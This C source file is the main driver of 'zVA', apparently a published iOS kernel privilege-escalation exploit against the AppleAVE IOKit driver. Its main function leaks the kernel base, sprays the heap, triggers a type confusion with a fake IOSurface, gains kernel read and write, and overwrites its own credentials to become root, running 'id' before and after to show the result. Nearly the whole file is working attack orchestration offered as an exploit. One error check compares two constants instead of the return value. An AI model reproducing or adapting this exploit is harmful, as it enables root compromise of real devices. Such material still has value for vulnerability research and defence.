#include "log.h"
#include "kernel_read.h"
#include "apple_ave_pwn.h"
#include "offsets.h"
#include "heap_spray.h"
//#include "dbg.h"
#include "iosurface_utils.h"
#include "rwx.h"
#include "post_exploit.h"

#define KERNEL_MAGIC 							(0xfeedfacf)

/*
 * Function name: 	print_welcome_message
 * Description:		Prints a welcome message. Includes credits.
 * Returns:			void.
 */

static
void print_welcome_message() {
	kern_return_t ret = KERN_SUCCESS;
	DEBUG_LOG("Welcome to zVA! Zimperium's unsandboxed kernel exploit");
	DEBUG_LOG("Credit goes to:");
	DEBUG_LOG("\tAdam Donenfeld (@doadam) for heap info leak, kernel base leak, type confusion vuln and exploit.");
}



/*
 * Function name: 	initialize_iokit_connections
 * Description:		Creates all the necessary IOKit objects for the exploitation.
 * Returns:			kern_return_t.
 */

static
kern_return_t initialize_iokit_connections() {
	
	kern_return_t ret = KERN_SUCCESS;

	ret = apple_ave_pwn_init();
	if (KERN_SUCCESS != ret)
	{
		ERROR_LOG("Error initializing AppleAVE pwn");
		goto cleanup;
	}

	ret = kernel_read_init();
	if (KERN_SUCCESS != ret)
	{
		ERROR_LOG("Error initializing kernel read");
		goto cleanup;
	}

cleanup:
	if (KERN_SUCCESS != ret)
	{
		kernel_read_cleanup();
		apple_ave_pwn_cleanup();
	}
	return ret;
}


/*
 * Function name: 	cleanup_iokit
 * Description:		Cleans up IOKit resources.
 * Returns:			kern_return_t.
 */

static
kern_return_t cleanup_iokit() {
	
	kern_return_t ret = KERN_SUCCESS;
	kernel_read_cleanup();
	apple_ave_pwn_cleanup();

	return ret;	
}


/*
 * Function name: 	test_rw_and_get_root
 * Description:		Tests our RW capabilities, then overwrites our credentials so we are root.
 * Returns:			kern_return_t.
 */

static
kern_return_t test_rw_and_get_root() {
	
	kern_return_t ret = KERN_SUCCESS;
	uint64_t kernel_magic = 0;

	ret = rwx_read(offsets_get_kernel_base(), &kernel_magic, 4);
	if (KERN_SUCCESS != ret || KERNEL_MAGIC != kernel_magic)
	{
		ERROR_LOG("error reading kernel magic");
		if (KERN_SUCCESS == ret)
		{
			ret = KERN_FAILURE;
		}
		goto cleanup;
	} else {
		DEBUG_LOG("kernel magic: %x", (uint32_t)kernel_magic);
	}

	ret = post_exploit_get_kernel_creds();
	if (KERN_SUCCESS != ret || getuid())
	{
		ERROR_LOG("error getting root");
		if (KERN_SUCCESS == ret)
		{
			ret = KERN_NO_ACCESS;
		}
		goto cleanup;
	}

cleanup:
	return ret;
}




int main(int argc, char const *argv[])
{
	#pragma unused(argc)
	#pragma unused(argv)
	kern_return_t ret = KERN_SUCCESS;
	void * kernel_base = NULL;
	void * kernel_spray_address = NULL;

	print_welcome_message();

	system("id");

	ret = offsets_init();
	if (KERN_SUCCESS != ret)
	{
		ERROR_LOG("Error initializing offsets for current device.");
		goto cleanup;
	}

	ret = initialize_iokit_connections();
	if (KERN_SUCCESS != ret)
	{
		ERROR_LOG("Error initializing IOKit connections!");
		goto cleanup;
	}

	ret = heap_spray_init();
	if (KERN_SUCCESS != ret)
	{
		ERROR_LOG("Error initializing heap spray");
		goto cleanup;
	}

	ret = kernel_read_leak_kernel_base(&kernel_base);
	if (KERN_SUCCESS != ret)
	{
		ERROR_LOG("Error leaking kernel base");
		goto cleanup;
	}

	DEBUG_LOG("Kernel base: %p", kernel_base);

	offsets_set_kernel_base(kernel_base);

	ret = heap_spray_start_spraying(&kernel_spray_address);
	if (KERN_SUCCESS != ret)
	{
		ERROR_LOG("Error spraying heap");
		goto cleanup;
	}

	ret = apple_ave_pwn_use_fake_iosurface(kernel_spray_address);
	if (KERN_SUCCESS != kIOReturnError)
	{
		ERROR_LOG("Error using fake IOSurface... we should be dead by here.");
	} else {
		DEBUG_LOG("We're still alive and the fake surface was used");
	}

	ret = test_rw_and_get_root();
	if (KERN_SUCCESS != ret)
	{
		ERROR_LOG("error getting root");
		goto cleanup;
	}

	system("id");


cleanup:
	cleanup_iokit();
	heap_spray_cleanup();
	return ret;
}
